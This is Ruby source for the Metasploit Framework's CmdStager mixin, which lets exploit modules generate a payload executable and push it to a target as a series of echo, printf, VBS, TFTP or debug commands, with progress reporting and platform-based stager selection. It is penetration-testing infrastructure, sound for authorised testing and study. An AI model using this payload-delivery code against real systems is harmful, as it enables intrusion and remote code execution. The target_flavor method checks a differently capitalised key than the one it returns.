# -*- coding: binary -*-

require 'rex/exploitation/cmdstager'
require 'msf/core/exploit/exe'

module Msf

###
#
# This mixin provides an interface to generating cmdstagers
#
###
module Exploit::CmdStager

  include Msf::Exploit::EXE

  STAGERS = {
    :bourne => Rex::Exploitation::CmdStagerBourne,
    :debug_asm => Rex::Exploitation::CmdStagerDebugAsm,
    :debug_write => Rex::Exploitation::CmdStagerDebugWrite,
    :echo => Rex::Exploitation::CmdStagerEcho,
    :printf => Rex::Exploitation::CmdStagerPrintf,
    :vbs => Rex::Exploitation::CmdStagerVBS,
    :vbs_adodb => Rex::Exploitation::CmdStagerVBS,
    :tftp => Rex::Exploitation::CmdStagerTFTP
  }

  STUBS = {
    :debug_asm => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "debug_asm"),
    :debug_write => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "debug_write"),
    :vbs => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64"),
    :vbs_adodb => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64_adodb")
  }

  attr_accessor :stager_instance
  attr_accessor :cmd_list
  attr_accessor :flavor
  attr_accessor :decoder_stub
  attr_accessor :exe

  #
  # Creates an instance of an exploit that uses an CmdStager overwrite.
  #
  def initialize(info = {})
    super

    register_advanced_options(
      [
        OptString.new('CMDSTAGER::FLAVOR', [ false, 'The CMD Stager to use.']),
        OptString.new('CMDSTAGER::DECODERSTUB', [ false, 'The decoder stub to use.'])
      ], self.class)
  end


  #
  # Execute the command stager while showing the progress
  #
  def execute_cmdstager(opts = {})

    # Select the correct flavor
    select_flavor(opts)
    raise ArgumentError, "Unable to select CMD Stager" if flavor.nil?
    raise ArgumentError, "The CMD Stager selected isn't compatible with the target" unless compatible_flavor?

    # Select the correct decoder
    select_decoder_stub(opts)

    # Generate the CMD stager list of commands
    self.cmd_list = generate_cmdstager(opts)

    # If the stager needs to do additional setup...
    stager_instance.setup(self)

    # Execute it... ensuring the stager gets a chance to cleanup
    begin
      execute_cmdstager_begin(opts)


      sent = 0
      total_bytes = 0
      cmd_list.each { |cmd| total_bytes += cmd.length }

      delay = opts[:delay]
      delay ||= 0.25

      cmd_list.each do |cmd|
        execute_command(cmd, opts)
        sent += cmd.length

        # In cases where a server has multiple threads, we want to be sure that
        # commands we execute happen in the correct (serial) order.
        ::IO.select(nil, nil, nil, delay)

        progress(total_bytes, sent)
      end

      execute_cmdstager_end(opts)
    ensure
      stager_instance.teardown(self)
    end
  end


  #
  # Generates a cmd stub based on the current target's architecture
  # and operating system.
  #
  def generate_cmdstager(opts = {}, pl = nil)

    opts[:decoder] = decoder_stub unless opts.include?(:decoder)

    self.exe = generate_payload_exe(:code => pl)

    self.stager_instance = create_stager
    cmd_list = stager_instance.generate(opts)

    if (cmd_list.nil? or cmd_list.length < 1)
      print_error("The command stager could not be generated")
      raise ArgumentError
    end

    cmd_list
  end


  #
  # Show the progress of the upload
  #
  def progress(total, sent)
    done = (sent.to_f / total.to_f) * 100
    percent = "%3.2f%%" % done.to_f
    print_status("Command Stager progress - %7s done (%d/%d bytes)" % [percent, sent, total])
  end

  #
  # Create an instance of the flavored stager
  #
  def create_stager
    STAGERS[flavor].new(exe)
  end

  #
  # Guess the default decoder stub if there is one defined for
  # the flavor
  #
  def guess_decoder
    return nil unless STUBS.key?(flavor)

    STUBS[flavor]
  end

  #
  # 1 - Use the decoder provided by the module source
  # 2 - Use the decoder by the user through datastore
  # 3 - Try to guess
  #
  def select_decoder_stub(opts)
    self.decoder_stub = nil

    if opts.include?(:decoder)
      self.decoder_stub = opts[:decoder]
      return
    end

    unless datastore['CMDSTAGER::DECODERSTUB'].blank?
      self.decoder_stub = datastore['CMDSTAGER::DECODERSTUB']
      return
    end

    self.decoder_stub = guess_decoder
  end

  #
  # 1 - Use the flavor provided by the module source
  # 2 - Use the flavor provided by the user through datastore
  # 3 - Try to guess
  #
  def select_flavor(opts)
    self.flavor = nil

    if opts.include?(:flavor)
      self.flavor = opts[:flavor]
      return
    end

    unless datastore['CMDSTAGER::FLAVOR'].blank?
      self.flavor = datastore['CMDSTAGER::FLAVOR'].to_sym
      return
    end

    self.flavor = guess_flavor
  end

  def guess_flavor
    return nil unless target_platform.names.length == 1
    c_platform = target_platform.names.first
    case c_platform
    when /linux/i
      :bourne
    when /osx/i
      :bourne
    when /unix/i
      :bourne
    when /win/i
      :vbs
    else
      nil
    end
  end

  def target_flavor
    return target.opts['CmdStagerFlavor'] if target && target.opts['CMDStagerFlavor']
    return module_info['CmdStagerFlavor'] if module_info['CMDStagerFlavor']
    nil
  end

  def compatible_flavor?
    target_flavor.nil? || target_flavor == flavor || target_flavor.include?(flavor)
  end

  #
  # Methods to override - not used internally
  #
  def execute_cmdstager_begin(opts)
  end
  def execute_cmdstager_end(opts)
  end

end

end
